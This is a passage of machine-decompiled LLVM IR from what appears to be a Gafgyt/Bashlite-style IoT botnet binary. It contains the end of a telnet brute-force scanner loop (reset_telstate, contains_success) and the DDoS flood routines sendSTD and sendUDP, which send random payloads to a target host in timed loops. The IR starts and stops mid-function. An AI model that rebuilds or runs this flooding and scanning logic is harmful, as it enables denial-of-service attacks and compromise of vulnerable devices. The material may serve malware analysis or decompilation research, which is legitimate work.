  %v0_804ccbd = load i32, i32* @esp, align 4
  %v1_804ccbd = add i32 %v0_804ccbd, 4
  %v2_804ccbd = inttoptr i32 %v1_804ccbd to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8057f23.177 to i32), i32* %v2_804ccbd, align 4
  %v0_804ccc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ccc5 = load i32, i32* @esp, align 4
  %v2_804ccc5 = inttoptr i32 %v1_804ccc5 to i32*
  store i32 %v0_804ccc5, i32* %v2_804ccc5, align 4
  %v4_804ccc8 = call i32 @__libc_send(i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804bced, i32 %v6_804be32)
  %v0_804cccd = load i32, i32* bitcast ([7 x i8*]* @global_var_80621a0.182 to i32*), align 32
  %v5_804ccd7 = inttoptr i32 %v0_804cccd to i8*
  %v1_804ccdd = and i32 %v0_804cccd, -256
  store i32 %v1_804ccdd, i32* %eax.global-to-local, align 4
  store i32 %v0_804cccd, i32* @edi, align 4
  %v3_804cce6 = call i32 @_strlen(i8* %v5_804ccd7)
  store i32 %v3_804cce6, i32* @ebx, align 4
  %v0_804ccef = load i32, i32* bitcast ([7 x i8*]* @global_var_80621a0.182 to i32*), align 32
  store i32 %v0_804ccef, i32* @esi, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804cd0b = load i32, i32* %v3_804cc71, align 4
  store i32 %v4_804cd0b, i32* %eax.global-to-local, align 4
  %v0_804cd0e = load i32, i32* @esp, align 4
  %v1_804cd0e = add i32 %v0_804cd0e, 12
  %v2_804cd0e = inttoptr i32 %v1_804cd0e to i32*
  store i32 16384, i32* %v2_804cd0e, align 4
  %v0_804cd16 = load i32, i32* @ebx, align 4
  %v1_804cd16 = load i32, i32* @esp, align 4
  %v2_804cd16 = add i32 %v1_804cd16, 8
  %v3_804cd16 = inttoptr i32 %v2_804cd16 to i32*
  store i32 %v0_804cd16, i32* %v3_804cd16, align 4
  %v0_804cd1a = load i32, i32* @esi, align 4
  %v1_804cd1a = load i32, i32* @esp, align 4
  %v2_804cd1a = add i32 %v1_804cd1a, 4
  %v3_804cd1a = inttoptr i32 %v2_804cd1a to i32*
  store i32 %v0_804cd1a, i32* %v3_804cd1a, align 4
  %v0_804cd1e = load i32, i32* %eax.global-to-local, align 4
  %v1_804cd1e = load i32, i32* @esp, align 4
  %v2_804cd1e = inttoptr i32 %v1_804cd1e to i32*
  store i32 %v0_804cd1e, i32* %v2_804cd1e, align 4
  %v5_804cd21 = call i32 @__libc_send(i32 %v0_804cccd, i32 %stack_var_-628.248, i32 %stack_var_-624.247, i32 %v2_804bced)
  store i32 %v5_804cd21, i32* %eax.global-to-local, align 4
  %v2_804cd26 = icmp slt i32 %v5_804cd21, 0
  %v1_804cd28 = icmp eq i1 %v2_804cd26, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804cd28, label %dec_label_pc_804cd4d, label %dec_label_pc_804cd2a

dec_label_pc_804cd2a:                             ; preds = %dec_label_pc_804cc2e
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804cd43 = load i32, i32* @esp, align 4
  %v2_804cd43 = inttoptr i32 %v1_804cd43 to i32*
  store i32 %v2_804bde4, i32* %v2_804cd43, align 4
  %v2_804cd46 = call i32 @reset_telstate(i32 %v0_804cccd)
  store i32 %v2_804cd46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804cd4d:                             ; preds = %dec_label_pc_804cc2e
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v2_804cd68 = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804cd68, i32* %eax.global-to-local, align 4
  %v1_804cd6a = add i32 %v2_804cd68, 25
  store i32 %v1_804cd6a, i32* @ebx, align 4
  %v0_804cd6d = load i32, i32* @esp, align 4
  %v1_804cd6d = inttoptr i32 %v0_804cd6d to i32*
  store i32 0, i32* %v1_804cd6d, align 4
  %tmp38 = inttoptr i32 %v0_804cccd to i32*
  %v3_804cd74 = call i32 @__GI_time(i32* %tmp38)
  store i32 %v3_804cd74, i32* %eax.global-to-local, align 4
  %v0_804cd79 = load i32, i32* @ebx, align 4
  %v7_804cd79 = icmp ult i32 %v0_804cd79, %v3_804cd74
  %v1_804cd7b = icmp eq i1 %v7_804cd79, false
  br i1 %v1_804cd7b, label %dec_label_pc_804cd9e, label %dec_label_pc_804cd7d

dec_label_pc_804cd7d:                             ; preds = %dec_label_pc_804cd4d
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804cd96 = load i32, i32* @esp, align 4
  %v2_804cd96 = inttoptr i32 %v1_804cd96 to i32*
  store i32 %v2_804bde4, i32* %v2_804cd96, align 4
  %v2_804cd99 = call i32 @reset_telstate(i32 %v0_804cccd)
  store i32 %v2_804cd99, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804cd9e:                             ; preds = %dec_label_pc_804be1c, %dec_label_pc_804cd4d, %dec_label_pc_804cbd4, %dec_label_pc_804c7e7, %dec_label_pc_804c554, %dec_label_pc_804c414, %dec_label_pc_804c057, %dec_label_pc_804cd2a, %dec_label_pc_804cc08, %dec_label_pc_804cbae, %dec_label_pc_804caf3, %dec_label_pc_804cac5, %dec_label_pc_804ca4b, %dec_label_pc_804c966, %dec_label_pc_804c940, %dec_label_pc_804c8dd, %dec_label_pc_804c81b, %dec_label_pc_804c7b9, %dec_label_pc_804c78b, %dec_label_pc_804c6d3, %dec_label_pc_804c6ad, %dec_label_pc_804c64a, %dec_label_pc_804c588, %dec_label_pc_804c526, %dec_label_pc_804c4f8, %dec_label_pc_804c448, %dec_label_pc_804c3ee, %dec_label_pc_804c354, %dec_label_pc_804c32e, %dec_label_pc_804c1da, %dec_label_pc_804c1b4, %dec_label_pc_804c037, %dec_label_pc_804bff8, %dec_label_pc_804cd7d
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.247, %dec_label_pc_804be1c ], [ %stack_var_-624.247, %dec_label_pc_804cd4d ], [ %stack_var_-624.247, %dec_label_pc_804cd7d ], [ %stack_var_-624.247, %dec_label_pc_804cd2a ], [ %stack_var_-624.247, %dec_label_pc_804cbd4 ], [ %stack_var_-624.247, %dec_label_pc_804cc08 ], [ %stack_var_-624.247, %dec_label_pc_804cbae ], [ %stack_var_-624.247, %dec_label_pc_804caf3 ], [ %stack_var_-624.247, %dec_label_pc_804cac5 ], [ %stack_var_-624.247, %dec_label_pc_804ca4b ], [ %stack_var_-624.247, %dec_label_pc_804c966 ], [ %stack_var_-624.247, %dec_label_pc_804c940 ], [ %stack_var_-624.247, %dec_label_pc_804c8dd ], [ %stack_var_-624.247, %dec_label_pc_804c7e7 ], [ %stack_var_-624.247, %dec_label_pc_804c81b ], [ %stack_var_-624.247, %dec_label_pc_804c7b9 ], [ %stack_var_-624.247, %dec_label_pc_804c78b ], [ %v4_804c5cc, %dec_label_pc_804c6d3 ], [ %v4_804c5cc, %dec_label_pc_804c6ad ], [ %v4_804c5cc, %dec_label_pc_804c64a ], [ %stack_var_-624.247, %dec_label_pc_804c554 ], [ %stack_var_-624.247, %dec_label_pc_804c588 ], [ %stack_var_-624.247, %dec_label_pc_804c526 ], [ %stack_var_-624.247, %dec_label_pc_804c4f8 ], [ %stack_var_-624.247, %dec_label_pc_804c414 ], [ %stack_var_-624.247, %dec_label_pc_804c448 ], [ %stack_var_-624.247, %dec_label_pc_804c3ee ], [ %stack_var_-624.247, %dec_label_pc_804c354 ], [ %stack_var_-624.247, %dec_label_pc_804c32e ], [ %stack_var_-624.247, %dec_label_pc_804c057 ], [ %stack_var_-624.247, %dec_label_pc_804c1da ], [ %stack_var_-624.247, %dec_label_pc_804c1b4 ], [ %stack_var_-624.247, %dec_label_pc_804c037 ], [ %stack_var_-624.247, %dec_label_pc_804bff8 ]
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.248, %dec_label_pc_804be1c ], [ %stack_var_-628.248, %dec_label_pc_804cd4d ], [ %stack_var_-628.248, %dec_label_pc_804cd7d ], [ %stack_var_-628.248, %dec_label_pc_804cd2a ], [ %stack_var_-628.248, %dec_label_pc_804cbd4 ], [ %stack_var_-628.248, %dec_label_pc_804cc08 ], [ %stack_var_-628.248, %dec_label_pc_804cbae ], [ %stack_var_-628.248, %dec_label_pc_804caf3 ], [ %stack_var_-628.248, %dec_label_pc_804cac5 ], [ %stack_var_-628.248, %dec_label_pc_804ca4b ], [ %v4_804c85f, %dec_label_pc_804c966 ], [ %v4_804c85f, %dec_label_pc_804c940 ], [ %v4_804c85f, %dec_label_pc_804c8dd ], [ %stack_var_-628.248, %dec_label_pc_804c7e7 ], [ %stack_var_-628.248, %dec_label_pc_804c81b ], [ %stack_var_-628.248, %dec_label_pc_804c7b9 ], [ %stack_var_-628.248, %dec_label_pc_804c78b ], [ %stack_var_-628.248, %dec_label_pc_804c6d3 ], [ %stack_var_-628.248, %dec_label_pc_804c6ad ], [ %stack_var_-628.248, %dec_label_pc_804c64a ], [ %stack_var_-628.248, %dec_label_pc_804c554 ], [ %stack_var_-628.248, %dec_label_pc_804c588 ], [ %stack_var_-628.248, %dec_label_pc_804c526 ], [ %stack_var_-628.248, %dec_label_pc_804c4f8 ], [ %stack_var_-628.248, %dec_label_pc_804c414 ], [ %stack_var_-628.248, %dec_label_pc_804c448 ], [ %stack_var_-628.248, %dec_label_pc_804c3ee ], [ %stack_var_-628.248, %dec_label_pc_804c354 ], [ %stack_var_-628.248, %dec_label_pc_804c32e ], [ %stack_var_-628.248, %dec_label_pc_804c057 ], [ %stack_var_-628.248, %dec_label_pc_804c1da ], [ %stack_var_-628.248, %dec_label_pc_804c1b4 ], [ %stack_var_-628.248, %dec_label_pc_804c037 ], [ %stack_var_-628.248, %dec_label_pc_804bff8 ]
  %v4_804cd9e = add nuw nsw i32 %storemerge49, 1
  store i32 %v4_804cd9e, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804cd9e, %arg2
  br i1 %exitcond, label %dec_label_pc_804bdc2, label %dec_label_pc_804bdce

; uselistorder directives
  uselistorder i32 %v4_804cd9e, { 1, 2, 0 }
  uselistorder i32 %stack_var_-628.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32* %v1_804c9ff, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804c97f, { 1, 0 }
  uselistorder i32 %v4_804c85f, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804c7d2, { 1, 0 }
  uselistorder i32 %v0_804c6ec, { 1, 0 }
  uselistorder i32 %v4_804c5cc, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804c53f, { 1, 0 }
  uselistorder i32 %v5_804c2b9, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804c258, { 1, 0 }
  uselistorder i32 %v2_804c23c, { 1, 0 }
  uselistorder i32 %v2_804c0a7, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v2_804be9a, { 1, 0 }
  uselistorder i32 %v6_804be32, { 8, 9, 10, 7, 5, 6, 4, 2, 3, 1, 0, 12, 11, 13 }
  uselistorder i32* %v1_804bde9, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804bde6, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804bde4, { 50, 49, 52, 51, 53, 39, 38, 41, 40, 42, 44, 43, 45, 46, 47, 48, 34, 33, 36, 35, 37, 28, 27, 29, 30, 31, 32, 23, 22, 25, 24, 26, 17, 16, 18, 19, 20, 21, 9, 8, 11, 10, 12, 14, 13, 15, 0, 2, 1, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804bde2, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 8, 44, 9 }
  uselistorder i32 %v1_804bdd4, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.247, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %stack_var_-628.248, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %storemerge49, { 2, 3, 4, 5, 6, 8, 7, 0, 1 }
  uselistorder i32 %v4_804bdb1, { 1, 2, 0 }
  uselistorder i32 %storemerge259, { 1, 0 }
  uselistorder i32 %v2_804bd0a, { 1, 0 }
  uselistorder i32 %v2_804bced, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 2, 4, 1, 0, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 3, 4, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 8, 9, 3, 4, 7, 2, 1, 5, 11, 10, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 45, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* %eax.global-to-local, { 198, 1, 0, 4, 2, 3, 6, 5, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 22, 20, 21, 24, 23, 27, 25, 26, 29, 28, 30, 31, 32, 33, 36, 34, 35, 37, 38, 41, 39, 40, 44, 42, 43, 47, 45, 46, 49, 48, 50, 51, 54, 52, 55, 53, 56, 57, 58, 60, 59, 63, 61, 62, 64, 65, 66, 67, 68, 69, 71, 70, 74, 72, 73, 79, 76, 80, 77, 78, 81, 82, 75, 83, 84, 85, 88, 86, 89, 87, 90, 91, 92, 94, 93, 97, 95, 96, 98, 99, 100, 101, 102, 103, 105, 104, 108, 106, 107, 113, 110, 114, 111, 112, 115, 116, 109, 117, 118, 119, 121, 120, 124, 122, 123, 126, 125, 129, 127, 128, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 150, 148, 149, 152, 151, 153, 154, 157, 155, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 176, 191, 192, 193, 194, 195, 196, 197, 220, 199, 200, 213, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 221, 214, 215, 216, 217, 219, 218 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804cd9e, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804be1c, { 1, 0 }
  uselistorder label %dec_label_pc_804bdce, { 1, 0 }
  uselistorder label %dec_label_pc_804bdc2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bdb1, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdb2 = load i32, i32* @ebp, align 4
  store i32 %v0_804cdb2, i32* %stack_var_-4, align 4
  %v4_804cdb2 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cdb2, i32* @ebp, align 4
  %v4_804cdd2 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804cde1 = call i32 @__GI_time(i32* null)
  %v1_804cdef = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804cdf7 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_804ce18 = add i32 %v1_804cdef, 12
  %v2_804ce18 = inttoptr i32 %v1_804ce18 to i32*
  %v3_804ce18 = load i32, i32* %v2_804ce18, align 4
  %v2_804ce20 = ptrtoint i32* %stack_var_-36 to i32
  %v1_804ce26 = add i32 %v1_804cdef, 16
  %v2_804ce26 = inttoptr i32 %v1_804ce26 to i32*
  %v3_804ce26 = load i32, i32* %v2_804ce26, align 4
  %v1_804ce29 = inttoptr i32 %v3_804ce26 to i32*
  %v2_804ce29 = load i32, i32* %v1_804ce29, align 4
  %v4_804ce36 = call i32 @bcopy(i32 %v2_804ce29, i32 %v2_804ce20, i32 %v3_804ce18)
  %v1_804ce3e = add i32 %v1_804cdef, 8
  %v2_804ce3e = inttoptr i32 %v1_804ce3e to i32*
  %v3_804ce3e = load i32, i32* %v2_804ce3e, align 4
  %v1_804ce41 = urem i32 %v3_804ce3e, 65536
  store i32 %v1_804ce41, i32* %stack_var_-40, align 4
  %v4_804ce74 = bitcast i32* %stack_var_-184 to i16*
  %v5_804cf1c = add i32 %v2_804cde1, %arg3
  br label %dec_label_pc_804ce59

dec_label_pc_804ce59:                             ; preds = %dec_label_pc_804cf41, %entry
  %storemerge = phi i32 [ %v4_804cf41, %dec_label_pc_804cf41 ], [ 0, %entry ]
  %v5_804ce74 = call i32 @memcpy(i16* %v4_804ce74, i32 ptrtoint ([36 x i8*]* @global_var_80580e0.219 to i32), i32 144)
  store i32 %v5_804ce74, i32* @eax, align 4
  %v0_804ce79 = call i32 @random()
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_804cf41, label %dec_label_pc_804cecf

dec_label_pc_804cecf:                             ; preds = %dec_label_pc_804ce59
  %v0_804cebf = load i32, i32* @ebp, align 4
  %v3_804cebf = add i32 %v0_804cebf, -180
  %v2_804ce94 = udiv i32 %v0_804ce79, 36
  %tmp29 = mul nsw i32 %v2_804ce94, -4
  %v2_804ceb1 = add i32 %v0_804ce79, %tmp29
  %v2_804cebf = mul i32 %v2_804ceb1, 4
  %v4_804cebf = add i32 %v3_804cebf, %v2_804cebf
  %v5_804cebf = inttoptr i32 %v4_804cebf to i32*
  %v6_804cebf = load i32, i32* %v5_804cebf, align 4
  %v5_804ceec = call i32 @__libc_send(i32 %v4_804cdd2, i32 %v6_804cebf, i32 65, i32 0)
  %v4_804cf06 = call i32 @__libc_connect(i32 %v4_804cdd2, i32 %v2_804cdf7, i32 16)
  %v2_804cf12 = call i32 @__GI_time(i32* null)
  %v5_804cf21 = icmp slt i32 %v2_804cf12, %v5_804cf1c
  br i1 %v5_804cf21, label %dec_label_pc_804cf41, label %dec_label_pc_804cf23

dec_label_pc_804cf23:                             ; preds = %dec_label_pc_804cecf
  %v1_804cf29 = call i32 @__libc_close(i32 %v4_804cdd2)
  %v1_804cf35 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cf41:                             ; preds = %dec_label_pc_804cecf, %dec_label_pc_804ce59
  %stack_var_-12.0 = phi i32 [ %storemerge, %dec_label_pc_804ce59 ], [ 0, %dec_label_pc_804cecf ]
  %v4_804cf41 = add i32 %stack_var_-12.0, 1
  br label %dec_label_pc_804ce59

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804cdef, { 1, 0, 2 }
  uselistorder i32 %v4_804cdd2, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp32 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804cf4d = load i32, i32* @ebx, align 4
  %v13_804cf4e = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804cf57 = icmp eq i32 %arg2, 0
  %v1_804cf5b = icmp eq i1 %v4_804cf57, false
  br i1 %v1_804cf5b, label %dec_label_pc_804cf6b, label %dec_label_pc_804cf5d

dec_label_pc_804cf5d:                             ; preds = %entry
  %v1_804cf5d = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804cf80

dec_label_pc_804cf6b:                             ; preds = %entry
  %v1_804cf6e = urem i32 %arg2, 65536
  store i32 %v1_804cf6e, i32* %eax.global-to-local, align 4
  store i32 %v1_804cf6e, i32* %stack_var_-140, align 4
  %v1_804cf74 = trunc i32 %arg2 to i16
  %v2_804cf74 = call i32 @htons(i16 %v1_804cf74)
  br label %dec_label_pc_804cf80

dec_label_pc_804cf80:                             ; preds = %dec_label_pc_804cf5d, %dec_label_pc_804cf6b
  %v2_804cf80 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v4_804cf90 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804cf90, i32* %eax.global-to-local, align 4
  %v1_804cf95 = icmp eq i32 %v4_804cf90, 0
  %v1_804cf97 = icmp eq i1 %v1_804cf95, false
  br i1 %v1_804cf97, label %dec_label_pc_804d43e, label %dec_label_pc_804cf9d

dec_label_pc_804cf9d:                             ; preds = %dec_label_pc_804cf80
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804cfb6 = icmp eq i32 %arg4, 32
  %v1_804cfba = icmp eq i1 %v9_804cfb6, false
  br i1 %v1_804cfba, label %dec_label_pc_804d0f6, label %dec_label_pc_804cfc0

dec_label_pc_804cfc0:                             ; preds = %dec_label_pc_804cf9d
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804cfd7 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804cfd7, i32* %eax.global-to-local, align 4
  %v4_804cfdf = icmp eq i32 %v4_804cfd7, 0
  %v1_804cfe3 = icmp eq i1 %v4_804cfdf, false
  br i1 %v1_804cfe3, label %dec_label_pc_804cfff, label %dec_label_pc_804cfe5

dec_label_pc_804cfe5:                             ; preds = %dec_label_pc_804cfc0
  %v0_804cfe5 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804cfe5, i32* %eax.global-to-local, align 4
  store i32 %v0_804cfe5, i32* %stack_var_-140, align 4
  %v3_804cff5 = call i32 @sockprintf(i32 %v0_804cfe5, i32 ptrtoint ([27 x i8]* @global_var_8058170.220 to i32))
  store i32 %v3_804cff5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d43e

dec_label_pc_804cfff:                             ; preds = %dec_label_pc_804cfc0
  %v1_804d002 = add i32 %arg5, 1
  store i32 %v1_804d002, i32* %eax.global-to-local, align 4
  store i32 %v1_804d002, i32* %stack_var_-140, align 4
  %v1_804d006 = call i32 @malloc(i32 %v1_804d002)
  store i32 %v1_804d006, i32* %eax.global-to-local, align 4
  %v4_804d00e = icmp eq i32 %v1_804d006, 0
  br i1 %v4_804d00e, label %dec_label_pc_804d43e, label %dec_label_pc_804d018

dec_label_pc_804d018:                             ; preds = %dec_label_pc_804cfff
  store i32 %v1_804d002, i32* %edx.global-to-local, align 4
  %v1_804d021 = inttoptr i32 %v1_804d006 to i8*
  store i32 %v1_804d006, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804d026 = and i32 %v1_804d006, -256
  store i32 %v1_804d026, i32* %eax.global-to-local, align 4
  %v5_804d028 = call i8* @_memset(i8* %v1_804d021, i32 %v1_804d026, i32 %v1_804d002)
  store i32 %v1_804d006, i32* %eax.global-to-local, align 4
  store i32 %v1_804d006, i32* %stack_var_-140, align 4
  %v4_804d037 = call i32 @makeRandomStr(i8* %v1_804d021, i32 %arg5)
  store i32 %v4_804d037, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804d043 = call i32 @__GI_time(i32* null)
  %v5_804d048 = add i32 %v2_804d043, %arg3
  store i32 %v5_804d048, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804d0d4 = sdiv i64 %sext, 4294967296
  %v3_804d0d4 = mul nsw i64 %v2_804d0d4, 1000
  %v4_804d0d4 = trunc i64 %v3_804d0d4 to i32
  br label %dec_label_pc_804d05e.outer

dec_label_pc_804d05e.outer:                       ; preds = %dec_label_pc_804d0d1, %dec_label_pc_804d0ee, %dec_label_pc_804d018
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804d018 ], [ 0, %dec_label_pc_804d0d1 ], [ %v4_804d0ee, %dec_label_pc_804d0ee ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804d018 ], [ %v4_804d0c6, %dec_label_pc_804d0d1 ], [ %v4_804d0c6, %dec_label_pc_804d0ee ]
  br label %dec_label_pc_804d05e

dec_label_pc_804d05e:                             ; preds = %dec_label_pc_804d05e.outer, %dec_label_pc_804d0a8
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804d0a8 ], [ %stack_var_-92.0.ph, %dec_label_pc_804d05e.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804cfd7, i32* %eax.global-to-local, align 4
  store i32 %v4_804cfd7, i32* %stack_var_-140, align 4
  %v7_804d089 = call i32 @__libc_sendto(i32 %v4_804cfd7, i32 %v1_804d006, i32 %arg5, i32 0, i32 %v2_804cf80, i32 16)
  store i32 %v7_804d089, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804d091 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804d094 = icmp eq i1 %v15_804d091, false
  br i1 %v1_804d094, label %dec_label_pc_804d0c6, label %dec_label_pc_804d096

dec_label_pc_804d096:                             ; preds = %dec_label_pc_804d05e
  br i1 %v1_804cf5b, label %dec_label_pc_804d0a8, label %dec_label_pc_804d09c

dec_label_pc_804d09c:                             ; preds = %dec_label_pc_804d096
  %v0_804d09c = load i32, i32* %stack_var_-140, align 4
  %v1_804d09c = call i32 @rand_cmwc(i32 %v0_804d09c)
  %v1_804d0a1 = urem i32 %v1_804d09c, 65536
  store i32 %v1_804d0a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d0a8

dec_label_pc_804d0a8:                             ; preds = %dec_label_pc_804d096, %dec_label_pc_804d09c
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804d0af = call i32 @__GI_time(i32* null)
  store i32 %v2_804d0af, i32* %eax.global-to-local, align 4
  %v8_804d0b7 = icmp sgt i32 %v2_804d0af, %v5_804d048
  br i1 %v8_804d0b7, label %dec_label_pc_804d43e, label %dec_label_pc_804d05e

dec_label_pc_804d0c6:                             ; preds = %dec_label_pc_804d05e
  %v4_804d0c6 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804d0cc = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804d0cf = icmp eq i1 %v15_804d0cc, false
  br i1 %v1_804d0cf, label %dec_label_pc_804d0ee, label %dec_label_pc_804d0d1

dec_label_pc_804d0d1:                             ; preds = %dec_label_pc_804d0c6
  store i32 %v4_804d0d4, i32* %eax.global-to-local, align 4
  store i32 %v4_804d0d4, i32* %stack_var_-140, align 4
